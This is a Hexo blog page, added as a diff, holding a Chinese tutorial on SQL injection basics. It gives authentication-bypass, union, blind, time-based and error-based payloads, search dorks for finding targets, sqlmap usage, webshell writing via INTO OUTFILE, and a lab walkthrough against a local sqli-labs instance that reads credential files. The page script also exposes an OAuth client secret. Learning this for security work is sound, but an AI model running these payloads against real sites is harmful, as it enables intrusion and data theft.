@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="心中有光の孩子">
+    <meta name="keyword"  content="tea9">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        1.sql注入基础 - tea9的博客 | tea9&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 努力活着 </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar">
+            <img src="/img/avatar.png" />
+        </div>
+        <div class="name">
+            <i>tea9</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#目录"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入原理"><span class="toc-text">SQL注入原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入原理-SQL注入产生原因"><span class="toc-text">SQL注入原理-SQL注入产生原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入原理-SQL注入核心原理"><span class="toc-text">SQL注入原理-SQL注入核心原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入的危害"><span class="toc-text">SQL注入的危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql注入语句"><span class="toc-text">mysql注入语句</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql注入语句-mysql介绍"><span class="toc-text">mysql注入语句-mysql介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql注入语句-万能密码"><span class="toc-text">mysql注入语句-万能密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql注入语句-注入语句例子"><span class="toc-text">mysql注入语句-注入语句例子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入流程"><span class="toc-text">sql注入流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL手工注入方法"><span class="toc-text">MySQL手工注入方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TIPS"><span class="toc-text">TIPS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例"><span class="toc-text">实例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关链接"><span class="toc-text">相关链接</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+        <div class="index-about-mobile">
+            <i> 努力活着 </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        1.sql注入基础
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2018-10-11 00:00:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#sql注入" title="sql注入">sql注入</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#web安全" title="web安全">web安全</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><!-- MarkdownTOC -->
+<ul>
+<li>SQL注入原理<ul>
+<li>SQL注入原理-SQL注入产生原因</li>
+<li>SQL注入原理-SQL注入核心原理</li>
+</ul>
+</li>
+<li>SQL注入的危害</li>
+<li>mysql注入语句<ul>
+<li>mysql注入语句-mysql介绍</li>
+<li>mysql注入语句-万能密码</li>
+<li>mysql注入语句-注入语句例子</li>
+</ul>
+</li>
+<li>sql注入流程</li>
+<li>MySQL手工注入方法</li>
+<li>TIPS</li>
+<li>实例</li>
+<li>相关链接</li>
+</ul>
+<!-- /MarkdownTOC -->
+<h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><h3 id="SQL注入原理-SQL注入产生原因"><a href="#SQL注入原理-SQL注入产生原因" class="headerlink" title="SQL注入原理-SQL注入产生原因"></a>SQL注入原理-SQL注入产生原因</h3><blockquote>
+<p>基于B/S架构的网络上，对安全控制能力较弱，然后开发人员水平和经验参差不齐，没有对用户输入数据，或者对页面中携带的信息进行必要的判断。攻击者利用这个机会提交一段数据库查询代码，可以获得一些数据库信息。</p>
+</blockquote>
+<h3 id="SQL注入原理-SQL注入核心原理"><a href="#SQL注入原理-SQL注入核心原理" class="headerlink" title="SQL注入原理-SQL注入核心原理"></a>SQL注入原理-SQL注入核心原理</h3><blockquote>
+<p>SQL注入是一种将恶意的SQL代码插入到用户的输入参数中的攻击，攻击者探测出开发者编程过程中的漏洞，利用漏洞，巧妙的构造SQL语句，对数据库的内容进行检索或修改。</p>
+</blockquote>
+<blockquote>
+<p>简单概括：利用现有应用程序，将精心构造的SQL语句“注入”到后台数据库所执行的恶意操作</p>
+</blockquote>
+<hr>
+<blockquote>
+<p>灵活的SQL查询语句+用户输入的数据带入可执行SQL语句=用户直接操作数据库-&gt;SQL注入漏洞</p>
+</blockquote>
+<h2 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h2><ul>
+<li>数据库信息泄露：数据库中存放的用户的隐私信息的泄漏。</li>
+<li>网页篡改：通过操作数据库对特定网页进行篡改。</li>
+<li>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li>
+<li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员账户被篡改。</li>
+<li>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</li>
+<li>破坏硬盘数据，瘫痪全系统</li>
+</ul>
+<h2 id="mysql注入语句"><a href="#mysql注入语句" class="headerlink" title="mysql注入语句"></a>mysql注入语句</h2><h3 id="mysql注入语句-mysql介绍"><a href="#mysql注入语句-mysql介绍" class="headerlink" title="mysql注入语句-mysql介绍"></a>mysql注入语句-mysql介绍</h3><blockquote>
+<p>MySQL是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL 是最流行的关系型数据库管理系统之一，在 WEB 应用方面，MySQL是最好的 RDBMS (Relational Database Management System，关系数据库管理系统) 应用软件。<br>MySQL是一种关系数据库管理系统，关系数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。<br>MySQL所使用的 SQL 语言是用于访问数据库的最常用标准化语言。MySQL 软件采用了双授权政策，分为社区版和商业版，由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，一般中小型网站的开发都选择 MySQL 作为网站数据库。</p>
+</blockquote>
+<p>– 摘自百度百科  </p>
+<h3 id="mysql注入语句-万能密码"><a href="#mysql注入语句-万能密码" class="headerlink" title="mysql注入语句-万能密码"></a>mysql注入语句-万能密码</h3><pre><code># 登录处正常的SQL语句：
+select * from users where username= &apos;admin&apos; and pwd = &apos;pass&apos;;
+
+# 万能密码：
+&apos;or &apos;1&apos; = &apos;1 
+
+# 带入用户输入参数
+select * from users where username= &apos;&apos;or &apos;1&apos; = &apos;1&apos; and pwd = &apos;&apos;or &apos;1&apos; = &apos;1&apos;;
+
+第一个 or 前面为 false 后面为 true -&gt; true
+and 前面为 true 后面为 false -&gt; false
+第二个 or 前面为 false 后面为 true -&gt; true
+</code></pre><h3 id="mysql注入语句-注入语句例子"><a href="#mysql注入语句-注入语句例子" class="headerlink" title="mysql注入语句-注入语句例子"></a>mysql注入语句-注入语句例子</h3><pre><code># 利用构造1=2错误执行union后面的语句
+and 1=2 union select 1,2,3--
+
+# 利用mysql正则表达式为匹配当前用户是否为ro开头
+select user() regexp &apos;^ro&apos;
+
+# 查询当前用户的ascii码是否为114（r）
+ascii(substr(substr(select user()),1,1))=114
+
+# 如果当前用户的ascii码为114（r） 就返回0 否则就睡5秒
+if(ascii(substr((select user()),1,1))=114,0,sleep(5))
+
+# 查询第一个表名的ascii码是否为99（c） 是返回1 否返回0
+(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=99)
+
+# 利用updatexml报错，返回版本信息
+updatexml(1,concat(0x7e,(select @@version),0x7e),1)
+</code></pre><h2 id="sql注入流程"><a href="#sql注入流程" class="headerlink" title="sql注入流程"></a>sql注入流程</h2><ol>
+<li><p><strong>目标搜集：</strong><br> 无特定目标：  </p>
+<pre><code>inurl:php?id=
+</code></pre><p> 有特定目标：  </p>
+<pre><code>inurl:php?id= site:target.com
+</code></pre><p> 工具爬取：  </p>
+<pre><code>spider，对搜索引擎和目标网站的链接进行爬取
+</code></pre></li>
+<li><p><strong>注入识别：</strong><br> 手工简单识别：  </p>
+<pre><code>&apos;
+and 1=1 / and 1=2
+and &apos;1&apos; =&apos;1 / and &apos;1&apos;=&apos;2
+and 1 like 1 / and 1 like 2
+</code></pre><p> 工具识别：  </p>
+<pre><code>sqlmap -m filename (filename中保存检测目标)
+sqlmap --crawl (sqlmap对网站进行爬取，然后依次进行测试)
+</code></pre></li>
+</ol>
+<ol start="3">
+<li><p><strong>高级识别：</strong>  </p>
+<p> 扩展识别广度和深度：  </p>
+<pre><code>sqlmap --level 增加测试级别，对header中相关参数也进行测试
+sqlmap -r filename(filename中为网站请求数据)
+</code></pre><p> 利用工具提高识别效率：  </p>
+<pre><code>BurpSuite + SqlMap
+</code></pre><p> Tips:  </p>
+<pre><code>可以在参数后键入 “*” 来确定想要测试的参数  
+可能出现注入的点：新闻、登录、搜索、留言......  
+站在开发的角度去寻找  
+</code></pre></li>
+<li><p><strong>代码审计：</strong>  </p>
+<p> 搜索关键代码和函数  </p>
+<pre><code>关键代码包括 $_GET/$_POST/$id/select/SELECT
+</code></pre><p> 梳理业务流程  </p>
+</li>
+</ol>
+<h2 id="MySQL手工注入方法"><a href="#MySQL手工注入方法" class="headerlink" title="MySQL手工注入方法"></a>MySQL手工注入方法</h2><p><strong>MySQL数据库结构</strong>  </p>
+<ul>
+<li>Mysql<ul>
+<li>连接层<ul>
+<li>通信协议</li>
+<li>线程</li>
+<li>验证</li>
+</ul>
+</li>
+<li>SQL层<ul>
+<li>解析器</li>
+<li>授权</li>
+<li>优化器</li>
+<li>查询执行</li>
+<li>查询高速缓存</li>
+<li>查询日志记录</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>SQL层的功能</strong>      </p>
+<ol>
+<li>判断语法、语句、语义</li>
+<li>数据库对象授权情况判断，授权失败不继续</li>
+<li>解析（解析器）：将sql语句解析成执行计划，运行执行计划，生成找数据的方式</li>
+<li>优化（优化器）：运行执行计划，基于算法，从执行计划中选择代价最小的交给“执行器”</li>
+<li>执行（执行器）：运行执行计划，最终生产如何去磁盘找数据方式</li>
+<li>将取数据的方式，交由下层（存储引擎层）进行处理</li>
+<li>最终将取出的数据抽象成管理员或用户能看懂的方式（表），展现在用户面前</li>
+<li>查询缓存：缓存之前查询的数据</li>
+</ol>
+<p><strong>MySQL内置库（&gt;=5.7）</strong>  </p>
+<p>mysql: 账户信息、权限信息、存储过程、event、时区等信息。  </p>
+<p>sys: 存储过程、自定义函数、视图帮助我们快速的了解系统的元数据信息。（元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等）  </p>
+<p>performance_schema: 用于收集数据库服务器性能参数  </p>
+<p>information_schema: 访问数据库元数据的方式，保存关于MySQL服务器所维护的所有其他数据库信息，如数据库名，数据库表，表的数据类型与访问权限等。</p>
+<p><strong>查询数据核心语法</strong>  </p>
+<pre><code># 查库
+select schema_name from information_schema.schemata;
+
+#查表
+select table_name from information_schema.tables where table_schema=库名;
+
+#查列
+select column_name from information_schema.columns where table_name=表名;
+
+#查数据
+select 列名 from 库名.表名;
+</code></pre><p><strong>Tips</strong>  </p>
+<p>提示1: 所有类型的sql注入，都是基于查库、表、列语句<br>提示2: 如果数据太多，导致无法返回查询结果：<br>    查询的场景：可利用limit限定返回数量及为止，依次查询<br>    <code>select username,password from security.users limit 0,1;</code><br>    回显数据的场景：<em> concat </em> 链接多个数据成为一条返回结果<br>    <code>select group_concat(schema_name) from infromation_schema.schemata;</code><br>提示3: 在一些场景，想要快速获取数据，需要借助工具，如：BurpSuite  </p>
+<p><strong>sql注入流程</strong>  </p>
+<p><a href="http://naotu.baidu.com/file/18232e9bd73bf191df5d048930c001bf?token=86fd9c0a184789f3" target="_blank" rel="noopener">思维导图</a>  </p>
+<ul>
+<li>SQL注入<ul>
+<li>信息搜集<ul>
+<li>数据库类型<ul>
+<li>报错信息 </li>
+<li>特有语句（不同数据库版本）</li>
+</ul>
+</li>
+<li>数据库版本</li>
+<li>数据库用户</li>
+<li>判断数据库权限</li>
+</ul>
+</li>
+<li>数据获取<ul>
+<li>获取库信息<ul>
+<li>获取当前库</li>
+<li>获取所有库</li>
+</ul>
+</li>
+<li>获取表信息</li>
+<li>获取列信息</li>
+<li>获取数据</li>
+</ul>
+</li>
+<li>提权<ul>
+<li>根据数据库权限<ul>
+<li>执行系统命令<ul>
+<li>直接提权（<ul>
+<li>mssql：调用xp.cmdshell执行系统命令、</li>
+<li>mysql：写木马到网站目录、</li>
+<li>sqlmap  <code>--os-shell（os shell会上传两个文件一个木马  一个是创建文件 富于这个文件775的权限控制权限））</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>读文件<ul>
+<li>读数据库配置文件,尝试远程连接</li>
+<li>读系统配置文件，搜集信息<ul>
+<li><code>select load_file(&#39;/etc/password&#39;)</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>写文件<ul>
+<li>写webshell到网站目录 <ul>
+<li>outfile (需要绝对路径) <code>（格式： select * into outfile &quot;文件地址&quot; 示例：select * info outfile &#39;f:/mysql/test/one&#39; form teacher_class; ）</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h2><p>mysql写shell</p>
+<blockquote>
+<p>1.需要知道绝对路径(web下层目录)<br>2.用户需要file权限(root可写)，一般用户不会有file权限<br>3.文件大小小于max_allow_upload<br>4.secure_file_priv 指定可写目录</p>
+</blockquote>
+<p>写</p>
+<pre><code>select &apos;&lt;?php phpinfo();?&gt;&apos; into outfile &apos;c://php//www//kkk.php&apos;;
+select &apos;&lt;?php phpinfo();?&gt;&apos; into dumpfile &apos;c://php//www//kkk2.php&apos;;
+select * from user into outfile &apos;c://php//www/kkk4.php&apos; fields terminated by &apos;&lt;?php phpinfo();?&gt;&apos;
+</code></pre><hr>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>tips:  </p>
+<blockquote>
+<p>查询数据的时候把信息记录到txt上</p>
+</blockquote>
+<pre><code># 判断是否存在sql注入 
+http://127.0.0.1/Less-1/?id=2&apos; 
+http://127.0.0.1/Less-1/?id=2&apos; and &apos;1&apos;=2
+
+# 判断列数
+http://127.0.0.1/Less-1/?id=2&apos; order by 3--+
+
+# 判断输出信息位置 (union之前要报错才会查询union后面的)
+http://127.0.0.1/Less-1/?id=99999&apos; union select 1,2,3--+
+
+# 查库名
+http://127.0.0.1/Less-1/?id=&apos; union select 1,2,（select group_concat(schema_name) from information_schema.schemata--+
+
+# 查表名 &apos;security&apos;/十六进制0x/database()
+http://127.0.0.1/Less-1/?id=&apos; union select 1,2,（select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;--+
+
+# 查数据 group_concat/concat_ws
+http://127.0.0.1/Less-1/?id=&apos; union select 1,2,（select group_concat(username,0x7e,password) from security.users)--+
+
+# 查权限
+http://127.0.0.1/Less-1/?id=&apos; union select 1,2,(select user())--+ 
+
+&gt; root@localhost 
+
+#  读文件 db-creds.inc 数据库配置文件
+http://127.0.0.1/Less-1/?id=&apos; union select 1,2,(select load_file(&apos;/var/www/html/sql-connections/db-creds.inc&apos;))--+ 
+</code></pre><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://www.mysql.com/" target="_blank" rel="noopener">mysql官网</a><br><a href="https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.html" target="_blank" rel="noopener">mysql内置函数</a><br><a href="http://ascii.911cha.com/" target="_blank" rel="noopener">ascii对照表</a><br><a href="http://www.runoob.com/mysql/mysql-regexp.html" target="_blank" rel="noopener">mysql正则</a><br><a href="https://blog.csdn.net/vspiders/article/details/77430024" target="_blank" rel="noopener">MYSQL updatexml报错注入</a><br><a href="https://blog.csdn.net/i_peter/article/details/53380334" target="_blank" rel="noopener">Python Spider 的总结</a><br><a href="https://blog.csdn.net/hxsstar/article/details/19337461" target="_blank" rel="noopener">MySQL手工注入步骤+直接写入一句话</a><br><a href="https://blog.csdn.net/m2417599488/article/details/72236666" target="_blank" rel="noopener">Mysql通过命令授于用户数据库操作权限</a><br><a href="https://blog.csdn.net/zhaoyangjian724/article/details/52121193" target="_blank" rel="noopener">mysql 函数执行权限</a>  </p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        <li>
+            <a target="_blank" href="https://twitter.com/shaomiaosun">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-twitter"></i>
+                            </span>
+            </a>
+        </li>
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/tea9">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="https://www.10000h.top">10000H</a></span>
+        <span>/</span>
+        
+        <span><a href="https://niexiaotao.com">Xiaotao&#39;s Page</a></span>
+        <span>/</span>
+        
+        <span><a href="#">It helps SEO</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script src="/js/gitment.js"></script>
+<script>
+    var gitment = new Gitment({
+        id: '1.sql注入基础',
+        owner: 'tea9',
+        repo: 'tea9.github.io',
+        oauth: {
+            client_id: 'dd67fb84ddbc6cf9c112',
+            client_secret: 'be4e88389be3e45fbafbd7592148fa47feacaacf',
+        },
+    })
+    gitment.render('comment-container')
+</script>
+
+
+
+
+</html>
